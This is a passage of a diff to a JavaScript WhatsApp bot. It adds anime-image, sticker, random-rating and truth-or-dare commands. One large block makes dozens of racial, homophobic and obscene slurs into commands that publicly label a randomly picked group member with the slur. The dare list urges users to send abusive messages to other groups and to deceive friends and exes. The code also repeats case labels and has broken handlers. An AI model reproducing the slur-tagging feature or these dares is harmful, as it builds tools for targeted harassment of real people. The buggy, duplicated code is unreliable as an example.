+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz126ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx126Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animewink':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/wink`)
+                           var wbuttszz127ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx127Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz127ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx127Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animepoke':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/poke`)
+                           var wbuttszz128ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx128Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz128ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx128Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animesmile':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/smile`)
+                           var wbuttszz129ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx129Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz129ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx129Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animewave':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/wave`)
+                           var wbuttszz1210ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx1210Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz1210ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx1210Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animeawoo':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/awoo`)
+                           var wbuttszz1211ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx1211Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz1211ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx1211Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animeblush':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/blush`)
+                           var wbuttszz1212ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx1212Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz1212ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx1212Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animesmug':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/smug`)
+                           var wbuttszz1213ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx1213Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz1213ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx1213Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animeglomp':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/glomp`)
+                           var wbuttszz1214ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx1214Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz1214ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx1214Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animehappy':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/happy`)
+                           var wbuttszz1215ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx1215Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz1215ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx1215Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animedance':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/dance`)
+                           var wbuttszz1216ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx1216Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz1216ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx1216Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animecringe':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/cringe`)
+                           var wbuttszz1217ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx1217Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz1217ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx1217Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animehighfive':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/highfive`)
+                           var wbuttszz1218ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx1218Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz1218ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx1218Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animehandhold':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/handhold`)
+                           var wbuttszz1219ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx1219Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz1219ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx1219Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animemegumin':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/megumin`)
+                           var wbuttszz1220ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx1220Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz1220ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx1220Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'shinobu2':  
+m.reply(mess.wait)						
+                    ud = await axios.get('https://waifu.pics/api/sfw/shinobu')
+var wbutsss = [
+    {buttonId: `.shinobu`, buttonText: {displayText: `Next 😼`}, type: 1},
+         ]
+      let buttonsesMessage = {
+      image: {url:ud.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+          buttons: wbutsss,
+     headerType: 4
+                      }
+await XeonBotInc.sendMessage(m.chat,buttonsesMessage, { quoted:m }).catch(err => {
+     return('Error!')
+    })               
+break
+case 'animemegumin':
+m.reply(mess.wait)						
+                    ud = await axios.get('https://waifu.pics/api/sfw/megumin')
+var wbutsss = [
+    {buttonId: `.megumin`, buttonText: {displayText: `Next 😼`}, type: 1},
+         ]
+      let buttonzMessage = {
+      image: {url:ud.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+          buttons: wbutsss,
+     headerType: 4
+                      }
+await XeonBotInc.sendMessage(m.chat,buttonzMessage, { quoted:m }).catch(err => {
+     return('Error!')
+    })               
+break     
+case 'animeawoo':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)
+ var wbuttsss = [
+    {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+    ]
+  let button1Messages = {
+   image: {url:waifudd.data.url},
+   caption:  `Here you go! 🏃🏻‍♂️`,
+   footer: `${global.botname}`,
+  buttons: wbuttsss,
+  headerType: 2
+  }       
+            await XeonBotInc.sendMessage(m.chat, button1Messages, { quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'patrick':
+case 'patricksticker': {
+var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
+var wifegerak = ano.split('\n')
+var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
+encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
+await fs.unlinkSync(encmedia)
+}
+break
+case 'ttp': {
+           if (!text) return m.reply(`*Example : ${prefix + command} hello*`)
+           await XeonBotInc.sendMedia(m.chat, `https://cililitan.herokuapp.com/api/texttopng2?teks=${text}`, 'A L Y A', 'B O T M D', m, {asSticker: true})
+         
+                     }
+                     break
+case 'dogesticker':
+case 'dogestick':
+	case 'doge':{
+var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
+var wifegerak = ano.split('\n')
+var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
+encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
+await fs.unlinkSync(encmedia)
+}
+break
+case 'lovesticker':
+case 'lovestick' :{
+var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
+var wifegerak = ano.split('\n')
+var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
+encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
+await fs.unlinkSync(encmedia)
+}
+break
+case 'gura':
+case 'gurastick':{
+var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
+var wifegerak = ano.split('\n')
+var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
+encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
+await fs.unlinkSync(encmedia)
+}
+break
+case 'handsomecheck':
+				if (!text) return m.reply(`Tag Someone, Example : ${prefix + command} @Xeon`)
+					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					const teng = gan[Math.floor(Math.random() * gan.length)]
+XeonBotInc.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
+
+					break
+case 'beautifulcheck':
+				if (!text) return m.reply(`Tag Someone, Example : ${prefix + command} @Xeon`)
+					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					const tik = can[Math.floor(Math.random() * can.length)]
+XeonBotInc.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
+					break
+					case 'charactercheck':
+					if (!text) return m.reply(`Tag Someone, Example : ${prefix + command} @Xeon`)
+					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
+					const taky = xeony[Math.floor(Math.random() * xeony.length)]
+					XeonBotInc.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
+				     break
+                    case 'awesomecheck':
+  case 'greatcheck':
+    case 'gaycheck':
+      case 'cutecheck':
+        case 'lesbicheck':
+          case 'lesbiancheck':
+             case 'hornycheck':
+                 case 'prettycheck':
+                    case 'lovelycheck':
+                      case 'uglycheck':
+				if (!text) return m.reply(`Tag Someone, Example : ${prefix + command} @Xeon`)
+					const sangeh = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
+XeonBotInc.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${sange}%*` }, { quoted: m })
+					break
+                    case 'stupid':
+      case 'foolish':
+      case 'smart':
+      case 'idiot':
+      case 'gay':
+      case 'lesbi':
+      case 'bastard':
+      case 'stubble':
+      case 'dog':
+      case 'fuck':
+      case 'ape':
+      case 'noob':
+      case 'great':
+      case 'horny':
+      case 'wibu':
+      case 'asshole':
+      case 'handsome':
+      case 'beautiful':
+      case 'cute':
+      case 'kind':
+      case 'ugly':
+      case 'pretty':
+      case 'lesbian':
+      case 'randi':
+      case 'gandu':
+      case 'madarchod':
+      case 'kala':
+      case 'gora':
+      case 'chutiya':
+      case 'nibba':
+      case 'nibbi':
+      case 'bhosdiwala':
+      case 'chutmarika':
+      case 'bokachoda':
+      case 'suarerbaccha':
+      case 'bolochoda':
+      case 'muthal':
+      case 'muthbaaz':
+      case 'randibaaz':
+      case 'topibaaz':
+      case 'cunt':
+      case 'nerd':
+      case 'behenchod':
+      case 'behnchoda':
+      case 'bhosdika':
+      case 'nerd':
+      case 'mc':
+      case 'bsdk':
+      case 'bhosdk':
+      case 'nigger':
+      case 'loda':
+      case 'laund':
+      case 'nigga':
+      case 'noobra':
+      case 'tharki':
+      case 'nibba':
+      case 'nibbi':
+      case 'mumu':
+      case 'rascal':
+      case 'scumbag':
+      case 'nuts':
+      case 'comrade':
+      case 'fagot':
+      case 'scoundrel':
+      case 'ditch':
+      case 'dope':
+      case 'gucci':
+      case 'lit':
+      case 'dumbass':
+      case 'sexy':
+      case 'crackhead':
+      case 'mf':
+      case 'motherfucker':
+      case 'dogla':
+      case 'bewda':
+      case 'boka':
+      case 'khanki':
+      case 'bal':
+      case 'sucker':
+      case 'fuckboy':
+      case 'playboy':
+      case 'fuckgirl':
+      case 'playgirl':
+      case 'hot': {
+            if (!m.isGroup) return m.reply(`${mess.group}`)
+            let member = participants.map(u => u.id)
+            let me = m.sender
+            let jodoh = member[Math.floor(Math.random() * member.length)]
+            let jawab = `The Most *${command}* Here Is @${jodoh.split('@')[0]}`
+            let ments = [me, jodoh]
+            let buttons = [
+                        { buttonId: '🔖‘', buttonText: { displayText: '🔖‘🔖˜‚' }, type: 1 }
+                    ]
+                    await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
+            }
+            break
+case 'dare':
+              const dare =[
+    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
+    "spill people who make you pause",
+    "call crush/pickle now and send ss",
+    "drop only emote every time you type on gc/pc for 1 day.",
+    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
+    "call ex saying miss",
+    "sing the chorus of the last song you played",
+    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss🔖¥º🔖‘‰🔖¼🔖‘ˆ🔖¼",
+	"Bang on the table (which is at home) until you get scolded for being noisy",
+    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
+    "mention ex's name",
+    "make 1 rhyme for the members!",
+    "send ur whatsapp chat list",
+    "chat random people with gheto language then ss here",
+    "tell your own version of embarrassing things",
+    "tag the person you hate",
+    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
+    "change name to *I AM DONKEY* for 24 hours",
+    "shout *ma chuda ma chuda ma chuda* in front of your house",
+    "snap/post boyfriend photo/crush",
+    "tell me your boyfriend type!",
+    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
+    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
+    "prank chat ex and say *i love u, please come back.* without saying dare!",
+    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
+    "change the name to *I am a child of randi* for 5 hours",
+    "type in bengali 24 hours",
+    "Use selmon bhoi photo for 3 days",
+    "drop a song quote then tag a suitable member for that quote",
+    "send voice note saying can i call u baby?",
+    "ss recent call whatsapp",
+    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
+    "pop to a group member, and say fuck you",
+    "Act like a chicken in front of ur parents",
+    "Pick up a random book and read one page out loud in vn n send it here",
+    "Open your front door and howl like a wolf for 10 seconds",
+    "Take an embarrassing selfie and paste it on your profile picture",
+    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
+    "Walk on your elbows and knees for as long as you can",
+    "sing national anthem in voice note",
+    "Breakdance for 30 seconds in the sitting room🔖˜‚",
+    "Tell the saddest story you know",
+    "make a twerk dance video and put it on status for 5mins",
+    "Eat a raw piece of garlic",
+    "Show the last five people you texted and what the messages said",
+    "put your full name on status for 5hrs",
+    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
+    "call ur bestie, bitch",
+    "put your photo without filter on ur status for 10mins",
+    "say i love oli london in voice note🔖🔖",
+    "Send a message to your ex and say I still like you",
+    "call Crush/girlfriend/bestie now and screenshot here",
+    "pop to one of the group member personal chat and Say you ugly bustard",
+    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
+    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
+    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
+    "use any bollywood actor photo as ur pfp for 3 days",
+    "put your crush photo on status with caption, this is my crush",
+    "change name to I AM GAY for 5 hours",
+    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
+    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
+    "slap ur butt hardly send the sound of slap through voice note🔖˜‚",
+    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
+    "shout bravooooooooo and send here through voice note",
+    "snap your face then send it here",
+    "Send your photo with a caption, i am lesbian",
+    "shout using harsh words and send it here through vn",
+    "shout you bastard in front of your mom/papa",
+    "change the name to i am idiot for 24 hours",
+    "slap urself firmly and send the sound of slap through voice note🔖˜‚",
+    "say i love the bot owner xeon through voice note",
+    "send your gf/bf pic here",
+    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
+    "breakup with your best friend for 5hrs without telling him/her that its a dare",
+     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
+     "say i love depak kalal through voice note",
+     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
+     "write i am lesbian and put it on status, u can delete only after 5hrs",
+     "kiss your mommy or papa and say i love you🔖˜Œ",
+     "put your father name on status for 5hrs",
+     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
+]
+              const xeondare = dare[Math.floor(Math.random() * dare.length)]
+              buffer = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
+              XeonBotInc.sendMessage(from, { image: buffer, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
+              break
+                            break
+       case 'truth':
+              const truth =[
+    "Have you ever liked anyone? How long?",
+    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
+    "apa ketakutan terbesar kamu?",
+    "Have you ever liked someone and felt that person likes you too?",
+    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
+    "Have you ever stolen money from your father or mom? The reason?",
+    "What makes you happy when you're sad?",
+    "Ever had a one sided love? if so who? how does it feel bro?", 
+    "been someone's mistress?",
+    "the most feared thing",
+    "Who is the most influential person in your life?",
+    "what proud thing did you get this year", 
+    "Who is the person who can make you awesome", 
+    "Who is the person who has ever made you very happy?", 
+    "Who is closest to your ideal type of partner here", 
+    "Who do you like to play with??", 
+    "Have you ever rejected people? the reason why?",
+    "Mention an incident that made you hurt that you still remember", 
+    "What achievements have you got this year??",
+    "What's your worst habit at school??",
+    "What song do you sing most in the shower",
+    "Have you ever had a near-death experience",
+    "When was the last time you were really angry. Why?",
+    "Who is the last person who called you",
+    "Do you have any hidden talents, What are they",
+    "What word do you hate the most?",
+    "What is the last YouTube video you watched?",
+    "What is the last thing you Googled",
+    "Who in this group would you want to swap lives with for a week",
+    "What is the scariest thing thats ever happened to you",
+    "Have you ever farted and blamed it on someone else",
+    "When is the last time you made someone else cry",
+    "Have you ever ghosted a friend",
+    "Have you ever seen a dead body",
+    "Which of your family members annoys you the most and why",
+    "If you had to delete one app from your phone, which one would it be",
+    "What app do you waste the most time on",
+    "Have you ever faked sick to get home from school",
+    "What is the most embarrassing item in your room",
+    "What five items would you bring if you got stuck on a desert island",
+    "Have you ever laughed so hard you peed your pants",
+    "Do you smell your own farts",
+    "have u ever peed on the bed while sleeping Ã°Å¸🔖¤🔖£Ã°Å¸🔖¤🔖£",
+    "What is the biggest mistake you have ever made",
+    "Have you ever cheated in an exam",
+    "What is the worst thing you have ever done",
+    "When was the last time you cried",
+    "whom do you love the most among ur parents", 
+    "do u sometimes put ur finger in ur nosetrilÃ°Å¸🔖¤🔖£", 
+    "who was ur crush during the school days",
+    "tell honestly, do u like any boy in this grup",
+    "have you ever liked anyone? how long?",
+    "do you have gf/bf','what is your biggest fear?",
+    "have you ever liked someone and felt that person likes you too?",
+    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
+    "ever did you steal your mothers money or your fathers money",
+    "what makes you happy when you are sad",
+    "do you like someone who is in this grup? if you then who?",
+    "have you ever been cheated on by people?",
+    "who is the most important person in your life",
+    "what proud things did you get this year",
+    "who is the person who can make you happy when u r sad",
+    "who is the person who ever made you feel uncomfortable",
+    "have you ever lied to your parents",
+    "do you still like ur ex",
+    "who do you like to play together with?",
+    "have you ever stolen big thing in ur life? the reason why?",
+    "Mention the incident that makes you hurt that you still remember",
+    "what achievements have you got this year?",
+    "what was your worst habit at school?",
+    "do you love the bot creator, Dayat Ganteng?🔖",
+    "have you ever thought of taking revenge from ur teacher?",
+    "do you like current prime minister of ur country",
+    "you non veg or veg",
+    "if you could be invisible, what is the first thing you would do",
+    "what is a secret you kept from your parents",
+    "Who is your secret crush",
+    "whois the last person you creeped on social media",
+    "If a genie granted you three wishes, what would you ask for",
+    "What is your biggest regret",
+    "What animal do you think you most look like",
+    "How many selfies do you take a day",
+    "What was your favorite childhood show",
+    "if you could be a fictional character for a day, who would you choose",
+    "whom do you text the most",
+    "What is the biggest lie you ever told your parents",
+    "Who is your celebrity crush",
+    "Whats the strangest dream you have ever had",
+    "do you play pubg, if you then send ur id number"
+]
+              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
+              buffer = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
+              XeonBotInc.sendMessage(from, { image: buffer, caption: '_You choose TRUTH_\n'+ xeontruth }, {quoted:m})
+              break  
+case 'fliptext': {
+if (args.length < 1) return m.reply(`Example:\n${prefix}fliptext ${ownername}`)
+quere = args.join(" ")
+flipe = quere.split('').reverse().join('')
+m.reply(`\`\`\` FLIP TEXT \`\`\`\n*🔖> Normal :*\n${quere}\n*🔖> Flip :*\n${flipe}`)
+}
+break
+case 'toviewonce': case 'toonce': { 
+        if (!quoted) return m.reply(`Reply image`)
+        if (/image/.test(mime)) {
+anu = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+XeonBotInc.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: m })
+        } else if (/video/.test(mime)) {
+        anu = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+        XeonBotInc.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: m })
+        }
+        }
+        break
+case 'autosticker':
+            case 'autostiker':
+if (!m.isGroup) return m.reply(mess.group)
+if (!isBotAdmins) return m.reply(mess.botAdmin)
+if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (args.length < 1) return m.reply('type auto sticker on to enable\ntype auto sticker off to disable')
+if (args[0]  === 'on'){
+if (isAutoSticker) return m.reply(`Already activated`)
+autosticker.push(from)
+fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
+m.reply('autosticker activated')
+} else if (args[0] === 'off'){
+let anu = autosticker.indexOf(from)
+autosticker.splice(anu, 1)
+fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
+m.reply('auto sticker deactivated')
+}
+break
+case 'autostickerpc':
+            case 'autostikerpc':
+if (!m.isGroup) return m.reply(mess.group)
+if (args.length < 1) return m.reply('type autosticker on to activate\ntype autosticker off to disable')
+if (args[0]  === 'on'){
+if (isAutoStick) return m.reply(`Already activated`)
+_autostick.push(from)
+fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autosticker))
+reply('autosticker pc activated')
+} else if (args[0] === 'off'){
+let anu = autosticker.indexOf(from)
+_autostick.splice(anu, 1)
+fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autosticker))
+m.reply('autosticker pc deactivated')
+}
+break
+case 'antivirus': case 'antivirtex': {
+if (!m.isGroup) return m.reply(mess.group)
+if (!isBotAdmins) return m.reply(mess.botAdmin)
+if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (args[0] === "on") {
+if (antiVirtex) return m.reply('Already activated')
+ntvirtex.push(from)
+m.reply('Success in turning on antivirus in this group')
+var groupe = await XeonBotInc.groupMetadata(from)
+var members = groupe['participants']
+var mems = []
+members.map(async adm => {
+mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
+})
+XeonBotInc.sendMessage(from, {text: `\`\`\`🔖Warning🔖\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+} else if (args[0] === "off") {
+if (!antiVirtex) return m.reply('Already deactivated')
+let off = ntvirtex.indexOf(from)
+ntvirtex.splice(off, 1)
+m.reply('Success in turning off antivirus this group')
+} else {
+  let buttonsntvirtex = [
+  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
+  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
+  ]
+  await XeonBotInc.sendButtonText(m.chat, buttonsntvirtex, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  }
+  }
+  break
+case 'autosticker':
+            case 'autostiker':
+if (!m.isGroup) return m.reply(mess.group)
+if (!isBotAdmins) return m.reply(mess.botAdmin)
+if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (args.length < 1) return m.reply('type auto sticker on to enable\ntype auto sticker off to disable')
+if (args[0]  === 'on'){
+if (isAutoSticker) return m.reply(`Already activated`)
+autosticker.push(from)
+fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
+reply('autosticker activated')
+} else if (args[0] === 'off'){
+let anu = autosticker.indexOf(from)
+autosticker.splice(anu, 1)
+fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
+m.reply('auto sticker deactivated')
+}
+break
+case 'autostickerpc':
+            case 'autostikerpc':
+if (!m.isGroup) return m.reply(mess.group)
+if (args.length < 1) return m.reply('type autosticker on to activate\ntype autosticker off to disable')
+if (args[0]  === 'on'){
+if (isAutoStick) return m.reply(`Already activated`)
+_autostick.push(from)
+fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autosticker))
+reply('autosticker pc activated')
